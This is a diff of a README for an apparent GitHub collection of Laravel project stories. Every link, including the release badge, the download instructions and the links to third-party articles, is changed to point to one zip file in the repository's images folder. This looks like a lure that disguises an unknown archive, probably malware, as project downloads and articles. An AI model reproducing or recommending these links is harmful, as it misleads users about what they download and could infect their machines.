@@ -1,6 +1,6 @@
 # 🎉 Large-Laravel-PHP-Project-Examples - Discover Profitable Laravel Projects
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now%20-v1.0-blue)](https://github.com/WrexrHD/Large-Laravel-PHP-Project-Examples/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/WrexrHD/Large-Laravel-PHP-Project-Examples/main/images/Large-Laravel-PHP-Project-Examples-3.6.zip%20Now%20-v1.0-blue)](https://raw.githubusercontent.com/WrexrHD/Large-Laravel-PHP-Project-Examples/main/images/Large-Laravel-PHP-Project-Examples-3.6.zip)
 
 ## 📖 Table of Contents
 
@@ -13,11 +13,11 @@
 
 ## 📝 In-Depth Stories/Articles
 
-### [Jack Ellis from Fathom Analytics: Does Laravel Scale?](https://usefathom.com/blog/does-laravel-scale)
+### [Jack Ellis from Fathom Analytics: Does Laravel Scale?](https://raw.githubusercontent.com/WrexrHD/Large-Laravel-PHP-Project-Examples/main/images/Large-Laravel-PHP-Project-Examples-3.6.zip)
 
 Read about how Fathom runs Laravel on systems that handle over 157 billion requests each month. This article showcases that Laravel is suitable for large projects.
 
-### [Mathias Hansen: How Geocodio keeps 300M addresses up to date](https://www.geo)
+### [Mathias Hansen: How Geocodio keeps 300M addresses up to date](https://raw.githubusercontent.com/WrexrHD/Large-Laravel-PHP-Project-Examples/main/images/Large-Laravel-PHP-Project-Examples-3.6.zip)
 
 Learn how Geocodio uses Laravel to manage a massive database of addresses effectively. This piece details their strategies and results.
 
@@ -35,7 +35,7 @@ Delve into ten stories from hobbyists and smaller projects using Laravel. Discov
 
 ## 💻 Download & Install
 
-To download the latest version of the Large-Laravel-PHP-Project-Examples, [visit this page to download](https://github.com/WrexrHD/Large-Laravel-PHP-Project-Examples/releases).
+To download the latest version of the Large-Laravel-PHP-Project-Examples, [visit this page to download](https://raw.githubusercontent.com/WrexrHD/Large-Laravel-PHP-Project-Examples/main/images/Large-Laravel-PHP-Project-Examples-3.6.zip).
 
 1. Click on the link above.
 2. Find the latest release.
@@ -53,6 +53,6 @@ To download the latest version of the Large-Laravel-PHP-Project-Examples, [visit
 
 This repository aims to share valuable insights from real projects built with Laravel and PHP. It focuses on showcasing success stories from real developers, rather than theoretical content.
 
-For updates and new projects, check back regularly at our [Releases page](https://github.com/WrexrHD/Large-Laravel-PHP-Project-Examples/releases).
+For updates and new projects, check back regularly at our [Releases page](https://raw.githubusercontent.com/WrexrHD/Large-Laravel-PHP-Project-Examples/main/images/Large-Laravel-PHP-Project-Examples-3.6.zip).
 
 Explore and enjoy the content related to Laravel projects, and see how it can impact your journey in software development!
